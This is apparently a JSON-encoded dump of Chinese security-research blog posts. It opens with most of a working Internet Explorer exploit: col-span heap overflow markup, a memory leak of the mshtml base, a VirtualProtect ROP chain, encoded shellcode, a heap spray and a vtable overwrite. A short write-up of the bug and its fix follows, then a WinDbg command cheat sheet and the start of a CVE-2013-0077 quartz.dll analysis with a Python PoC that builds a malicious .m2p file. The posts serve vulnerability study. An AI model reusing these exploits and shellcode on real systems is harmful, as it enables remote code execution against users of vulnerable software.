&lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"14\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"15\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"16\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"17\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"18\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"19\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"20\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"21\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"22\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"23\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"24\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"25\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"26\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"27\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"28\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"29\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"30\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"31\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"32\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"33\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"34\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"35\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"36\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"37\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"38\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"39\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"40\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"41\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"42\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"43\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"44\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"45\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"46\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"47\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"48\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"49\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"50\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"51\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"52\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"53\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"54\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"55\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"56\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"57\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"58\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"59\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"60\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"61\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"62\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"63\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"64\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"65\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"66\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"67\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"68\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"69\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"70\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"71\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"72\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"73\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"74\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"75\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"76\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"77\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"78\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"79\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"80\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"81\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"82\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"83\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"84\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"85\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"86\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"87\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"88\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"89\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"90\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"91\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"92\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"93\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"94\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"95\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"96\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"97\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"98\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"99\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"100\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"101\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"102\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"103\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"104\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"105\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"106\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"107\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"108\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"109\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"110\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"111\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"112\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"113\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"114\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"115\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"116\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"117\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"118\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"119\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"120\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"121\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"122\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"123\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"124\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"125\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"126\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"127\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"128\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"129\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"130\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"131\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"132\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;script language='javascript'&gt;var mshtmlbase = \"\";var dap = \"EEEE\";while ( dap.length &lt; 480 ) dap += dap;var padding = \"AAAA\";while ( padding.length &lt; 480 ) padding += padding;var filler = \"BBBB\";while ( filler.length &lt; 480 ) filler += filler;var arr = new Array();var rra = new Array();var div_container = document.getElementById(\"bUYP\");div_container.style.cssText = \"display:none\";for (var i=0; i &lt; 500; i+=2) &#123; rra[i] = dap.substring(0, (0x100-6)/2); arr[i] = padding.substring(0, (0x100-6)/2); arr[i+1] = filler.substring(0, (0x100-6)/2); var obj = document.createElement(\"button\"); div_container.appendChild(obj);&#125;for (var i=200; i&lt;500; i+=2 ) &#123; rra[i] = null; CollectGarbage();&#125;var obj_col = document.getElementById(\"132\");var obj_col1 = document.getElementById(\"131\");var obj_col2 = document.getElementById(\"130\");var obj_col3 = document.getElementById(\"129\");obj_col.span = 19;obj_col1.span = 19;obj_col2.span = 19;obj_col3.span = 19;function over_trigger() &#123; var leak_addr = -1; for ( var i = 0; i &lt; 500; i++ ) &#123; if ( arr[i].length &gt; (0x100-6)/2 ) &#123; // overflowed leak_index = i; // alert(leak_index); var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2); leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 ); // alert(\"CButtonLayout point:0x\" + leak_addr.toString(16)); mshtmlbase = leak_addr - Number(0x00173af8); // alert(\"mshtml base:0x\" + mshtmlbase.toString(16)); break; &#125; &#125; if ( leak_addr == -1 || leak_index == -1 ) &#123; alert(\"memory leak failed....\"); &#125;//return mshtmlbase;&#125;function heap_spray()&#123; CollectGarbage(); var heapobj = new Object(); function rop_chain(mshtmlbase)&#123; var arr = [ mshtmlbase + Number(0x117f0), // # retn mshtmlbase + Number(0x50c736), // # POP EBP # RETN [mshtml.dll] mshtmlbase + Number(0x117ef), // # 0x0707002C stack pivot:xchg eax,esp ; retn mshtmlbase + Number(0x50c736), // # POP EBP # RETN [mshtml.dll] mshtmlbase + Number(0x50c736), // # skip 4 bytes [mshtml.dll] mshtmlbase + Number(0x9478e), // # POP EBX # RETN [mshtml.dll] 0x00000201, // # 0x00000201-&gt; ebx mshtmlbase + Number(0x27e491), // # POP EDX # RETN [mshtml.dll] 0x00000040, // # 0x00000040-&gt; edx mshtmlbase + Number(0x343b), // # POP ECX # RETN [mshtml.dll] mshtmlbase + Number(0x53b7ca), // # &amp;Writable location [mshtml.dll] mshtmlbase + Number(0x195a6e), // # POP EDI # RETN [mshtml.dll] mshtmlbase + Number(0x424902), // # RETN (ROP NOP) [mshtml.dll] mshtmlbase + Number(0x3e0b3e), // # POP ESI # RETN [mshtml.dll] mshtmlbase + Number(0xa057), // # JMP [EAX] [mshtml.dll] mshtmlbase + Number(0x4abfd2), // # POP EAX # RETN [mshtml.dll] mshtmlbase + Number(0x1308), // # ptr to &amp;VirtualProtect() [IAT mshtml.dll] mshtmlbase + Number(0x3a37c0), // # PUSHAD # RETN [mshtml.dll] mshtmlbase + Number(0x748bc), // # ptr to 'jmp esp' [mshtml.dll] 0x90909090, 0x06eb, //0x90909090, //0xE9909090,// pop retn machineCode //0x1B000707 ]; return arr; &#125; function d2u(dword)&#123; var uni = String.fromCharCode(dword &amp; 0xFFFF); uni += String.fromCharCode(dword&gt;&gt;16); return uni; &#125; function tab2uni(heapobj, tab)&#123; var uni = \"\" for(var i=0;i&lt;tab.length;i++)&#123; uni += heapobj.d2u(tab[i]); &#125; return uni; &#125; heapobj.tab2uni = tab2uni; heapobj.d2u = d2u; heapobj.rop_chain = rop_chain; var code = unescape(\"%u7dbd%u35c4%udbef%ud9c9%u2474%u5ff4%uc931%u42b1%u6f31%u8314%u04c7%u6f03%u9f10%uec31%uc404%u7b63%u0eff%u56a2%u994d%u9ff4%ueed6%u2f86%u869c%udb64%u7ad4%u9dfe%u0910%u027e%u3baa%u0d47%u36b4%uc844%u69c5%u0a55%u02a5%ue9c6%u9f02%uce52%ucbc1%u5674%u19d7%uec0f%u56cf%ud14a%u83ee%u2588%ud8b8%ucd7b%u303b%u2eb2%u0c0a%u7c49%u4ce9%u7ac6%u8333%u842a%uf074%ubdc1%u2206%ub702%ua117%u1308%u5ed9%ud0ca%uebd5%ubd98%ueaf9%uca75%u6706%u2588%u338f%ua9af%u78f1%ud91d%uaad8%u3feb%u9093%u3184%u1aea%u1cb9%ubd1b%u5ebe%u4824%ua505%u3460%u475e%u4fe5%uac42%ua758%u53f5%uc8a3%ue983%u5e54%u9df8%udf44%u6d68%uf1b7%uf90c%u7ec2%u8ba8%u5b1c%u30ba%u5179%u2e32%u9ad7%uab11%ua651%u08ca%u84c9%ud2a6%ud48d%u791c%ubb7a%u82a3%u2b85%u1e32%uf312%u94a2%u7180%u3d52%u1c22%ud3f5%u059d%u777d%ub2fa%u6bf7%uaa6a%u0464%u5a33%ub61f%ufbb1%u51b7%u9a5f%uaf29%ud456%uebfa%u6d63%uc5e3%u3fa1%u74b7%u4014%u46e7%uee58%ufcf7%u4150\"); var rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(mshtmlbase)) ; var shellcode = rop_chain + code; while (shellcode.length &lt; 100000) shellcode = shellcode + shellcode; var onemeg = shellcode.substr(0, 64*1024/2); for (i=0; i&lt;14; i++) &#123; onemeg += shellcode.substr(0, 64*1024/2); &#125; onemeg += shellcode.substr(0, (64*1024/2)-(38/2)); var spray = new Array(); for (i=0; i&lt;400; i++) &#123; spray[i] = onemeg.substr(0, onemeg.length); &#125;&#125;function smash_vtable()&#123; // alert(\"start\"); var obj_col_0 = document.getElementById(\"132\"); obj_col_0.width = \"1178993\"; //0x07070024 obj_col_0.span = \"44\";&#125;setTimeout(\"over_trigger();\",1);setTimeout(function()&#123;heap_spray()&#125;, 400);setTimeout(function()&#123;smash_vtable()&#125;, 700);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 结果 漏洞修复就是在span更改后重新分配相应大小的内存即可 总结 漏洞的原因是span值改变后内存没有重新分配或者再次申请更多内存，导致可以越界写 在信息泄露的时候通过巧妙的构造，覆盖字符串头部的长度值，可以泄露出CButton虚表指针，从而通过偏移计算存储mshtml的基址 在漏洞利用的时候，通过特定的长度值，覆盖虚表指针，导致任意代码执行，通过堆的巧妙布局，精确地控制数据的布局，利用rop绕过DEP，成功执行代码 漏洞之外的东西 调试过程中下的断点太重要了，只要下对了，一下就找到关键点，整个人都阔然开朗 调试ie的漏洞，特别是javascript相关的，用javascript断点或者alert可以大大节省调试时间，因为你下一个断点可能断得太多，你让javascript执行到那里采取启用断点，那就可以节省很多时间了","categories":[],"tags":[]},{"title":"windbg 调试笔记","slug":"windbg 调试笔记","date":"2017-08-19T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2017/08/19/windbg 调试笔记/","link":"","permalink":"https://www.giantbranch.cn/2017/08/19/windbg 调试笔记/","excerpt":"","text":"虽然这是2017年8月19日的文章，但这是20190524才上传的，以后估计也会不断更新，也许不会更新，这可能取决于我以后对windbg用得更加6吧 windbg 调试笔记符号srv*c:\\symbols*http://msdl.microsoft.com/download/symbols 显示加载的模块 lm 加载符号 ln * 程序入口伪寄存器WinDbg里有个伪寄存器叫$exentry，里面记录了程序的入口点。所以我们只要在命令输入栏里输入bp $exentry 查看内存 dd 查看内存 dc 可以看到数据 db 以byte查看 dt 查看数据结构 修改内存eb/ew/ed/eq/ef/ep Address [Values]字节/字/双字/四字/浮点数/指针/ea/eu/eza/ezu Address [Values]ASCII字符串/Unicode字符串/以NULL结尾的ASCII字符串/以NULL结尾的Unicode字符串 搜索内存s -[b/w/d/q/a/u] Range Target搜索字节/字/双字/四字/ASCII字符串/Unicode字符串 断点 bp 下断点 bl 列断点 bc 清除断点 bd 禁用断点 下内存断点ba r4/w4/e4 xxxxxxx 条件断点 “.if(poi(xxx) == 0x0000xxx){}.else{gc}” 模块加载时下断 sxe ld:ntdll 查看SEH链!exchain或者dt ntdll!_EXCEPTION_REGISTRATION_RECORD -l next poi(ExceptionList的首指针) 其他~* 列出线程数 .childdbg 1 开启子进程调试","categories":[],"tags":[{"name":"windbg","slug":"windbg","permalink":"https://www.giantbranch.cn/tags/windbg/"},{"name":"调试","slug":"调试","permalink":"https://www.giantbranch.cn/tags/调试/"}]},{"title":"当gflag不“奏效”——CVE-2013-0077 Microsoft DirectShow quartz.dll m2p文件堆溢出漏洞","slug":"当gflag不“奏效”——CVE-2013-0077 Microsoft DirectShow quartz.dll m2p文件堆溢出漏洞","date":"2017-08-19T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2017/08/19/当gflag不“奏效”——CVE-2013-0077 Microsoft DirectShow quartz.dll m2p文件堆溢出漏洞/","link":"","permalink":"https://www.giantbranch.cn/2017/08/19/当gflag不“奏效”——CVE-2013-0077 Microsoft DirectShow quartz.dll m2p文件堆溢出漏洞/","excerpt":"","text":"作者原文：https://security.tencent.com/index.php/blog/msg/15这个是漏洞战争里面的例子，搜了一下没人写，自己实践过程中没能像作者那样开启htc，开启hpa后一步到达相应位置，而我开启后没能预期那样，所以写下此文 首先exploitdb搜了一下，poc在下面，软件也给了https://www.exploit-db.com/exploits/21991/ poc也贴上 12345678910111213141516l = 3315716 * \"A\"s1 = ((0,'\\x00\\x00\\x01\\xba'), (2048, '\\x00\\x00\\x01\\xba'), (3289120, '\\x00\\x00\\x01\\xe0\\x07'), (3289273, '\\x00\\x00\\x01\\xb3'), (3289283, '\\xba'), (3289452, '\\x42\\x42\\x42\\x42'), (3289468, '\\x00\\x00\\x01\\x00'), (3290359, '\\x00\\x00\\x01\\x00'), (3301408, '\\x00\\x00\\x01\\xe0\\x07'), (3303112, '\\x00\\x00\\x01\\x00'))# EAX overwrite(3289452, '\\x42\\x42\\x42\\x42') call eax+0x24 o = open(\"c:\\\\poc.m2p\",\"wb\")o.write(l) for i in range(len(s1)): o.seek(s1[i][0], 0) o.write(s1[i][1]) o.close() 环境及工具 xp sp3 quartz.dll 版本：6.5.2600.5596 windbg 调试过程注：其实调试过程中遇到过很多奇葩的异常，没有一一列出 首先对qq播放器开启堆尾检查 123C:\\Program Files\\Debugging Tools for Windows (x86)&gt;gflags.exe -i qqplayer.exe +htcCurrent Registry Settings for qqplayer.exe executable are: 00000010 htc - Enable heap tail checking windbg附加运行，打开文件没异常，应该是quartz.dll版本过高了6.5.2600.6333，换个虚拟机作者是6.5.2600.5596，发现吾爱破解的虚拟机刚好是这个版本 首先再次确认一下gflag 